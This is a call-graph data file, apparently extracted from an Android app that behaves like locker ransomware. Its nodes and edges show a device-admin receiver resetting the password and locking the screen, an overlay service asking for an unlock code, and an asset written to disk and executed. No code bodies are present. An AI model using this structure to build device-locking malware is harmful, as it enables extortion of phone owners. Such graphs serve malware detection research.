graph [
  directed 1
  node [
    id 0
    label "Ladrt/ADRTLogCatReader;-><init>()V [access_flags=public constructor] @ 0x2894"
    external 0
    entrypoint 0
  ]
  node [
    id 1
    label "Ljava/lang/Object;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 2
    label "Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0x28b0"
    external 0
    entrypoint 0
  ]
  node [
    id 3
    label "Ladrt/ADRTSender;->onContext(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0x25bc"
    external 0
    entrypoint 0
  ]
  node [
    id 4
    label "Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 5
    label "Landroid/content/Context;->getApplicationContext()Landroid/content/Context;"
    external 1
    entrypoint 0
  ]
  node [
    id 6
    label "Ljava/lang/Thread;->start()V"
    external 1
    entrypoint 0
  ]
  node [
    id 7
    label "Ljava/lang/Thread;-><init>(Ljava/lang/Runnable; Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 8
    label "Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;"
    external 1
    entrypoint 0
  ]
  node [
    id 9
    label "Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String; I)Landroid/content/pm/PackageInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 10
    label "Ladrt/ADRTLogCatReader;->run()V [access_flags=public] @ 0x2974"
    external 0
    entrypoint 0
  ]
  node [
    id 11
    label "Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 12
    label "Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;"
    external 1
    entrypoint 0
  ]
  node [
    id 13
    label "Ljava/io/BufferedReader;-><init>(Ljava/io/Reader; I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 14
    label "Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;"
    external 1
    entrypoint 0
  ]
  node [
    id 15
    label "Ladrt/ADRTSender;->sendLogcatLines([Ljava/lang/String;)V [access_flags=public static] @ 0x27b8"
    external 0
    entrypoint 0
  ]
  node [
    id 16
    label "Ljava/io/BufferedReader;->readLine()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 17
    label "Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;"
    external 1
    entrypoint 0
  ]
  node [
    id 18
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; [Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 19
    label "Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 20
    label "Landroid/content/Intent;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 21
    label "Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 22
    label "Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 23
    label "Ladrt/ADRTSender;-><init>()V [access_flags=public constructor] @ 0x25a0"
    external 0
    entrypoint 0
  ]
  node [
    id 24
    label "Ladrt/ADRTSender;->sendBreakpointHit(Ljava/lang/String; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList;)V [access_flags=public static] @ 0x25e0"
    external 0
    entrypoint 0
  ]
  node [
    id 25
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/io/Serializable;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 26
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 27
    label "Ladrt/ADRTSender;->sendConnect(Ljava/lang/String;)V [access_flags=public static] @ 0x26b0"
    external 0
    entrypoint 0
  ]
  node [
    id 28
    label "Ladrt/ADRTSender;->sendFields(Ljava/lang/String; Ljava/lang/String; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList;)V [access_flags=public static] @ 0x2710"
    external 0
    entrypoint 0
  ]
  node [
    id 29
    label "Ladrt/ADRTSender;->sendStop(Ljava/lang/String;)V [access_flags=public static] @ 0x2818"
    external 0
    entrypoint 0
  ]
  node [
    id 30
    label "Lcom/h/BuildConfig;-><init>()V [access_flags=public constructor] @ 0x2878"
    external 0
    entrypoint 0
  ]
  node [
    id 31
    label "Lcom/h/DU;-><init>()V [access_flags=public constructor] @ 0x1de4"
    external 0
    entrypoint 0
  ]
  node [
    id 32
    label "Lcom/h/DU;-><init>(Ljava/lang/String;)V [access_flags=public constructor] @ 0x1e04"
    external 0
    entrypoint 0
  ]
  node [
    id 33
    label "Ljavax/crypto/Cipher;->init(I Ljava/security/Key;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 34
    label "Ljava/lang/String;->getBytes()[B"
    external 1
    entrypoint 0
  ]
  node [
    id 35
    label "Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;"
    external 1
    entrypoint 0
  ]
  node [
    id 36
    label "Lcom/h/DU;->getKey([B)Ljava/security/Key; [access_flags=private] @ 0x1f54"
    external 0
    entrypoint 0
  ]
  node [
    id 37
    label "Ljava/lang/Exception;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 38
    label "Ljavax/crypto/spec/SecretKeySpec;-><init>([B Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 39
    label "Lcom/h/DU;->byteArr2HexStr([B)Ljava/lang/String; [access_flags=public static] @ 0x1eb0"
    external 0
    entrypoint 0
  ]
  node [
    id 40
    label "Ljava/lang/StringBuffer;-><init>(I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 41
    label "Ljava/lang/Integer;->toString(I I)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 42
    label "Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 43
    label "Ljava/lang/StringBuffer;->toString()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 44
    label "Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 45
    label "Lcom/h/DU;->hexStr2ByteArr(Ljava/lang/String;)[B [access_flags=public static] @ 0x1fc0"
    external 0
    entrypoint 0
  ]
  node [
    id 46
    label "Ljava/lang/String;-><init>([B I I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 47
    label "Ljava/lang/Integer;->parseInt(Ljava/lang/String; I)I"
    external 1
    entrypoint 0
  ]
  node [
    id 48
    label "Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String; [access_flags=public] @ 0x2048"
    external 0
    entrypoint 0
  ]
  node [
    id 49
    label "Lcom/h/DU;->decrypt([B)[B [access_flags=public] @ 0x2084"
    external 0
    entrypoint 0
  ]
  node [
    id 50
    label "Ljava/lang/String;-><init>([B)V"
    external 1
    entrypoint 0
  ]
  node [
    id 51
    label "Ljavax/crypto/Cipher;->doFinal([B)[B"
    external 1
    entrypoint 0
  ]
  node [
    id 52
    label "Lcom/h/DU;->encrypt(Ljava/lang/String;)Ljava/lang/String; [access_flags=public] @ 0x20ac"
    external 0
    entrypoint 0
  ]
  node [
    id 53
    label "Lcom/h/DU;->encrypt([B)[B [access_flags=public] @ 0x20e0"
    external 0
    entrypoint 0
  ]
  node [
    id 54
    label "Lcom/h/M;-><init>()V [access_flags=public constructor] @ 0x237c"
    external 0
    entrypoint 0
  ]
  node [
    id 55
    label "Landroid/app/Activity;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 56
    label "Lcom/h/M;->activiteDevice()V [access_flags=private] @ 0x2398"
    external 0
    entrypoint 0
  ]
  node [
    id 57
    label "Lcom/h/M;->startActivityForResult(Landroid/content/Intent; I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 58
    label "Ljava/lang/Throwable;->getMessage()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 59
    label "Landroid/content/ComponentName;-><init>(Landroid/content/Context; Ljava/lang/Class;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 60
    label "Landroid/content/Intent;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 61
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Landroid/os/Parcelable;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 62
    label "Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;"
    external 1
    entrypoint 0
  ]
  node [
    id 63
    label "Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 64
    label "Lcom/h/M;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x242c"
    external 0
    entrypoint 0
  ]
  node [
    id 65
    label "Ljava/io/InputStream;->read([B)I"
    external 1
    entrypoint 0
  ]
  node [
    id 66
    label "Ljava/io/IOException;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 67
    label "Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 68
    label "Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;"
    external 1
    entrypoint 0
  ]
  node [
    id 69
    label "Lcom/h/M;->getAssets()Landroid/content/res/AssetManager;"
    external 1
    entrypoint 0
  ]
  node [
    id 70
    label "Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 71
    label "Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;"
    external 1
    entrypoint 0
  ]
  node [
    id 72
    label "Ljava/lang/StringBuffer;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 73
    label "Ljava/io/File;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 74
    label "Ljava/io/FileOutputStream;->close()V"
    external 1
    entrypoint 0
  ]
  node [
    id 75
    label "Ljava/io/FileOutputStream;->write([B I I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 76
    label "Ljava/io/InputStream;->close()V"
    external 1
    entrypoint 0
  ]
  node [
    id 77
    label "Lcom/h/MyAdmin;-><init>()V [access_flags=public constructor] @ 0x2108"
    external 0
    entrypoint 0
  ]
  node [
    id 78
    label "Landroid/app/admin/DeviceAdminReceiver;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 79
    label "Lcom/h/MyAdmin;->onDisableRequested(Landroid/content/Context; Landroid/content/Intent;)Ljava/lang/CharSequence; [access_flags=public] @ 0x2124"
    external 0
    entrypoint 0
  ]
  node [
    id 80
    label "Lcom/h/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;"
    external 1
    entrypoint 0
  ]
  node [
    id 81
    label "Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String; I)Z"
    external 1
    entrypoint 0
  ]
  node [
    id 82
    label "Ljava/lang/Integer;->toString(I)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 83
    label "Landroid/app/admin/DeviceAdminReceiver;->onDisableRequested(Landroid/content/Context; Landroid/content/Intent;)Ljava/lang/CharSequence;"
    external 1
    entrypoint 0
  ]
  node [
    id 84
    label "Landroid/app/admin/DevicePolicyManager;->lockNow()V"
    external 1
    entrypoint 0
  ]
  node [
    id 85
    label "Lcom/h/MyAdmin;->onEnabled(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x218c"
    external 0
    entrypoint 0
  ]
  node [
    id 86
    label "Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 87
    label "Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 88
    label "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;"
    external 1
    entrypoint 0
  ]
  node [
    id 89
    label "Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 90
    label "Lcom/h/MyAdmin;->onPasswordChanged(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x2254"
    external 0
    entrypoint 0
  ]
  node [
    id 91
    label "Landroid/app/admin/DeviceAdminReceiver;->onPasswordChanged(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 92
    label "Lcom/h/MyAdmin;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x22b8"
    external 0
    entrypoint 0
  ]
  node [
    id 93
    label "Landroid/util/Log;->i(Ljava/lang/String; Ljava/lang/String;)I"
    external 1
    entrypoint 0
  ]
  node [
    id 94
    label "Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 95
    label "Lcom/h/R$anim;-><init>()V [access_flags=public constructor] @ 0x31e8"
    external 0
    entrypoint 0
  ]
  node [
    id 96
    label "Lcom/h/R$attr;-><init>()V [access_flags=public constructor] @ 0x2308"
    external 0
    entrypoint 0
  ]
  node [
    id 97
    label "Lcom/h/R$color;-><init>()V [access_flags=public constructor] @ 0x1dac"
    external 0
    entrypoint 0
  ]
  node [
    id 98
    label "Lcom/h/R$drawable;-><init>()V [access_flags=public constructor] @ 0x22ec"
    external 0
    entrypoint 0
  ]
  node [
    id 99
    label "Lcom/h/R$id;-><init>()V [access_flags=public constructor] @ 0x30c4"
    external 0
    entrypoint 0
  ]
  node [
    id 100
    label "Lcom/h/R$layout;-><init>()V [access_flags=public constructor] @ 0x30a8"
    external 0
    entrypoint 0
  ]
  node [
    id 101
    label "Lcom/h/R$string;-><init>()V [access_flags=public constructor] @ 0x308c"
    external 0
    entrypoint 0
  ]
  node [
    id 102
    label "Lcom/h/R$style;-><init>()V [access_flags=public constructor] @ 0x1d90"
    external 0
    entrypoint 0
  ]
  node [
    id 103
    label "Lcom/h/R$xml;-><init>()V [access_flags=public constructor] @ 0x3070"
    external 0
    entrypoint 0
  ]
  node [
    id 104
    label "Lcom/h/R;-><init>()V [access_flags=public constructor] @ 0x31cc"
    external 0
    entrypoint 0
  ]
  node [
    id 105
    label "Lcom/h/bbb;-><init>()V [access_flags=public constructor] @ 0x1cd0"
    external 0
    entrypoint 1
  ]
  node [
    id 106
    label "Landroid/content/BroadcastReceiver;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 107
    label "Lcom/h/bbb;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x1cec"
    external 0
    entrypoint 1
  ]
  node [
    id 108
    label "Lcom/h/bbb;->abortBroadcast()V"
    external 1
    entrypoint 1
  ]
  node [
    id 109
    label "Landroid/content/Intent;->getAction()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 110
    label "Ljava/lang/String;->equals(Ljava/lang/Object;)Z"
    external 1
    entrypoint 0
  ]
  node [
    id 111
    label "Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 112
    label "Lcom/h/s$100000000;-><init>(Lcom/h/s;)V [access_flags=constructor] @ 0x2324"
    external 0
    entrypoint 0
  ]
  node [
    id 113
    label "Ljava/lang/Thread;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 114
    label "Lcom/h/s$100000000;->start()V"
    external 1
    entrypoint 0
  ]
  node [
    id 115
    label "Lcom/h/s$100000001;-><init>(Lcom/h/s;)V [access_flags=constructor] @ 0x30e0"
    external 0
    entrypoint 0
  ]
  node [
    id 116
    label "Lcom/h/s$100000001;->onClick(Landroid/view/View;)V [access_flags=public] @ 0x3124"
    external 0
    entrypoint 0
  ]
  node [
    id 117
    label "Landroid/widget/EditText;->getText()Landroid/text/Editable;"
    external 1
    entrypoint 0
  ]
  node [
    id 118
    label "Landroid/text/Editable;->toString()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 119
    label "Lcom/h/s;->access$L1000001(Lcom/h/s;)Landroid/view/WindowManager; [access_flags=static synthetic] @ 0x2a34"
    external 0
    entrypoint 1
  ]
  node [
    id 120
    label "Landroid/view/WindowManager;->removeView(Landroid/view/View;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 121
    label "Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 122
    label "Lcom/h/s;->access$L1000002(Lcom/h/s;)Landroid/view/View; [access_flags=static synthetic] @ 0x2a50"
    external 0
    entrypoint 1
  ]
  node [
    id 123
    label "Lcom/h/s;->stopSelf()V"
    external 1
    entrypoint 1
  ]
  node [
    id 124
    label "Lcom/h/s;-><init>()V [access_flags=public constructor] @ 0x2a18"
    external 0
    entrypoint 1
  ]
  node [
    id 125
    label "Landroid/app/Service;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 126
    label "Lcom/h/s;->c()V [access_flags=private] @ 0x2aac"
    external 0
    entrypoint 1
  ]
  node [
    id 127
    label "Lcom/h/s;->getApplication()Landroid/app/Application;"
    external 1
    entrypoint 1
  ]
  node [
    id 128
    label "Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 129
    label "Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 130
    label "Landroid/view/LayoutInflater;->inflate(I Landroid/view/ViewGroup;)Landroid/view/View;"
    external 1
    entrypoint 0
  ]
  node [
    id 131
    label "Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;"
    external 1
    entrypoint 0
  ]
  node [
    id 132
    label "Landroid/view/WindowManager;->addView(Landroid/view/View; Landroid/view/ViewGroup$LayoutParams;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 133
    label "Landroid/view/View;->findViewById(I)Landroid/view/View;"
    external 1
    entrypoint 0
  ]
  node [
    id 134
    label "Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 135
    label "Landroid/view/WindowManager$LayoutParams;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 136
    label "Landroid/content/SharedPreferences;->getLong(Ljava/lang/String; J)J"
    external 1
    entrypoint 0
  ]
  node [
    id 137
    label "Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 138
    label "Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external 1
    entrypoint 0
  ]
  node [
    id 139
    label "Lcom/h/s;->is(Landroid/content/Context;)Z [access_flags=public] @ 0x2cf4"
    external 0
    entrypoint 1
  ]
  node [
    id 140
    label "Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external 1
    entrypoint 0
  ]
  node [
    id 141
    label "Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 142
    label "Landroid/net/NetworkInfo;->isAvailable()Z"
    external 1
    entrypoint 0
  ]
  node [
    id 143
    label "Lcom/h/s;->onCreate()V [access_flags=public] @ 0x2d68"
    external 0
    entrypoint 1
  ]
  node [
    id 144
    label "Landroid/content/SharedPreferences$Editor;->commit()Z"
    external 1
    entrypoint 0
  ]
  node [
    id 145
    label "Lcom/h/s;->getSharedPreferences(Ljava/lang/String; I)Landroid/content/SharedPreferences;"
    external 1
    entrypoint 1
  ]
  node [
    id 146
    label "Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String; J)Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 147
    label "Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 148
    label "Ljava/lang/Long;-><init>(J)V"
    external 1
    entrypoint 0
  ]
  node [
    id 149
    label "Landroid/app/Service;->onCreate()V"
    external 1
    entrypoint 0
  ]
  node [
    id 150
    label "Ljava/lang/Long;->parseLong(Ljava/lang/String;)J"
    external 1
    entrypoint 0
  ]
  node [
    id 151
    label "Lcom/h/s;->getApplicationContext()Landroid/content/Context;"
    external 1
    entrypoint 1
  ]
  node [
    id 152
    label "Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 153
    label "Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 154
    label "Ljava/lang/Math;->random()D"
    external 1
    entrypoint 0
  ]
  node [
    id 155
    label "Lcom/h/s;->onStart(Landroid/content/Intent; I)V [access_flags=public] @ 0x3044"
    external 0
    entrypoint 1
  ]
  node [
    id 156
    label "Landroid/app/Service;->onStart(Landroid/content/Intent; I)V"
    external 1
    entrypoint 0
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 2
    target 4
  ]
  edge [
    source 2
    target 5
  ]
  edge [
    source 2
    target 6
  ]
  edge [
    source 2
    target 7
  ]
  edge [
    source 2
    target 8
  ]
  edge [
    source 2
    target 0
  ]
  edge [
    source 2
    target 9
  ]
  edge [
    source 10
    target 11
  ]
  edge [
    source 10
    target 12
  ]
  edge [
    source 10
    target 13
  ]
  edge [
    source 10
    target 14
  ]
  edge [
    source 10
    target 15
  ]
  edge [
    source 10
    target 16
  ]
  edge [
    source 10
    target 17
  ]
  edge [
    source 15
    target 18
  ]
  edge [
    source 15
    target 19
  ]
  edge [
    source 15
    target 20
  ]
  edge [
    source 15
    target 21
  ]
  edge [
    source 15
    target 22
  ]
  edge [
    source 23
    target 1
  ]
  edge [
    source 24
    target 25
  ]
  edge [
    source 24
    target 26
  ]
  edge [
    source 24
    target 21
  ]
  edge [
    source 24
    target 22
  ]
  edge [
    source 24
    target 19
  ]
  edge [
    source 24
    target 20
  ]
  edge [
    source 27
    target 19
  ]
  edge [
    source 27
    target 20
  ]
  edge [
    source 27
    target 21
  ]
  edge [
    source 27
    target 26
  ]
  edge [
    source 27
    target 22
  ]
  edge [
    source 28
    target 20
  ]
  edge [
    source 28
    target 25
  ]
  edge [
    source 28
    target 26
  ]
  edge [
    source 28
    target 21
  ]
  edge [
    source 28
    target 22
  ]
  edge [
    source 28
    target 19
  ]
  edge [
    source 29
    target 19
  ]
  edge [
    source 29
    target 20
  ]
  edge [
    source 29
    target 21
  ]
  edge [
    source 29
    target 26
  ]
  edge [
    source 29
    target 22
  ]
  edge [
    source 30
    target 1
  ]
  edge [
    source 31
    target 32
  ]
  edge [
    source 32
    target 33
  ]
  edge [
    source 32
    target 34
  ]
  edge [
    source 32
    target 35
  ]
  edge [
    source 32
    target 36
  ]
  edge [
    source 32
    target 37
  ]
  edge [
    source 32
    target 1
  ]
  edge [
    source 36
    target 38
  ]
  edge [
    source 39
    target 40
  ]
  edge [
    source 39
    target 41
  ]
  edge [
    source 39
    target 42
  ]
  edge [
    source 39
    target 43
  ]
  edge [
    source 39
    target 44
  ]
  edge [
    source 45
    target 46
  ]
  edge [
    source 45
    target 47
  ]
  edge [
    source 45
    target 34
  ]
  edge [
    source 48
    target 49
  ]
  edge [
    source 48
    target 50
  ]
  edge [
    source 48
    target 45
  ]
  edge [
    source 49
    target 51
  ]
  edge [
    source 52
    target 39
  ]
  edge [
    source 52
    target 34
  ]
  edge [
    source 52
    target 53
  ]
  edge [
    source 53
    target 51
  ]
  edge [
    source 54
    target 55
  ]
  edge [
    source 56
    target 57
  ]
  edge [
    source 56
    target 58
  ]
  edge [
    source 56
    target 59
  ]
  edge [
    source 56
    target 60
  ]
  edge [
    source 56
    target 61
  ]
  edge [
    source 56
    target 62
  ]
  edge [
    source 56
    target 63
  ]
  edge [
    source 64
    target 44
  ]
  edge [
    source 64
    target 65
  ]
  edge [
    source 64
    target 66
  ]
  edge [
    source 64
    target 67
  ]
  edge [
    source 64
    target 68
  ]
  edge [
    source 64
    target 2
  ]
  edge [
    source 64
    target 69
  ]
  edge [
    source 64
    target 70
  ]
  edge [
    source 64
    target 12
  ]
  edge [
    source 64
    target 71
  ]
  edge [
    source 64
    target 43
  ]
  edge [
    source 64
    target 72
  ]
  edge [
    source 64
    target 73
  ]
  edge [
    source 64
    target 74
  ]
  edge [
    source 64
    target 75
  ]
  edge [
    source 64
    target 76
  ]
  edge [
    source 64
    target 56
  ]
  edge [
    source 77
    target 78
  ]
  edge [
    source 79
    target 80
  ]
  edge [
    source 79
    target 81
  ]
  edge [
    source 79
    target 82
  ]
  edge [
    source 79
    target 83
  ]
  edge [
    source 79
    target 84
  ]
  edge [
    source 85
    target 81
  ]
  edge [
    source 85
    target 86
  ]
  edge [
    source 85
    target 62
  ]
  edge [
    source 85
    target 58
  ]
  edge [
    source 85
    target 87
  ]
  edge [
    source 85
    target 63
  ]
  edge [
    source 85
    target 88
  ]
  edge [
    source 85
    target 80
  ]
  edge [
    source 85
    target 82
  ]
  edge [
    source 85
    target 89
  ]
  edge [
    source 90
    target 80
  ]
  edge [
    source 90
    target 81
  ]
  edge [
    source 90
    target 82
  ]
  edge [
    source 90
    target 91
  ]
  edge [
    source 90
    target 84
  ]
  edge [
    source 92
    target 93
  ]
  edge [
    source 92
    target 94
  ]
  edge [
    source 95
    target 1
  ]
  edge [
    source 96
    target 1
  ]
  edge [
    source 97
    target 1
  ]
  edge [
    source 98
    target 1
  ]
  edge [
    source 99
    target 1
  ]
  edge [
    source 100
    target 1
  ]
  edge [
    source 101
    target 1
  ]
  edge [
    source 102
    target 1
  ]
  edge [
    source 103
    target 1
  ]
  edge [
    source 104
    target 1
  ]
  edge [
    source 105
    target 106
  ]
  edge [
    source 107
    target 108
  ]
  edge [
    source 107
    target 62
  ]
  edge [
    source 107
    target 109
  ]
  edge [
    source 107
    target 87
  ]
  edge [
    source 107
    target 110
  ]
  edge [
    source 107
    target 58
  ]
  edge [
    source 107
    target 88
  ]
  edge [
    source 107
    target 111
  ]
  edge [
    source 107
    target 63
  ]
  edge [
    source 112
    target 113
  ]
  edge [
    source 115
    target 1
  ]
  edge [
    source 116
    target 117
  ]
  edge [
    source 116
    target 110
  ]
  edge [
    source 116
    target 118
  ]
  edge [
    source 116
    target 119
  ]
  edge [
    source 116
    target 120
  ]
  edge [
    source 116
    target 121
  ]
  edge [
    source 116
    target 122
  ]
  edge [
    source 116
    target 123
  ]
  edge [
    source 116
    target 48
  ]
  edge [
    source 124
    target 125
  ]
  edge [
    source 126
    target 127
  ]
  edge [
    source 126
    target 115
  ]
  edge [
    source 126
    target 128
  ]
  edge [
    source 126
    target 129
  ]
  edge [
    source 126
    target 43
  ]
  edge [
    source 126
    target 130
  ]
  edge [
    source 126
    target 131
  ]
  edge [
    source 126
    target 132
  ]
  edge [
    source 126
    target 133
  ]
  edge [
    source 126
    target 44
  ]
  edge [
    source 126
    target 48
  ]
  edge [
    source 126
    target 72
  ]
  edge [
    source 126
    target 134
  ]
  edge [
    source 126
    target 135
  ]
  edge [
    source 126
    target 136
  ]
  edge [
    source 126
    target 137
  ]
  edge [
    source 126
    target 138
  ]
  edge [
    source 139
    target 140
  ]
  edge [
    source 139
    target 141
  ]
  edge [
    source 139
    target 142
  ]
  edge [
    source 143
    target 144
  ]
  edge [
    source 143
    target 43
  ]
  edge [
    source 143
    target 145
  ]
  edge [
    source 143
    target 146
  ]
  edge [
    source 143
    target 44
  ]
  edge [
    source 143
    target 147
  ]
  edge [
    source 143
    target 48
  ]
  edge [
    source 143
    target 139
  ]
  edge [
    source 143
    target 136
  ]
  edge [
    source 143
    target 2
  ]
  edge [
    source 143
    target 148
  ]
  edge [
    source 143
    target 72
  ]
  edge [
    source 143
    target 149
  ]
  edge [
    source 143
    target 52
  ]
  edge [
    source 143
    target 121
  ]
  edge [
    source 143
    target 134
  ]
  edge [
    source 143
    target 32
  ]
  edge [
    source 143
    target 150
  ]
  edge [
    source 143
    target 151
  ]
  edge [
    source 143
    target 152
  ]
  edge [
    source 143
    target 153
  ]
  edge [
    source 143
    target 114
  ]
  edge [
    source 143
    target 112
  ]
  edge [
    source 143
    target 154
  ]
  edge [
    source 155
    target 156
  ]
  edge [
    source 155
    target 126
  ]
]
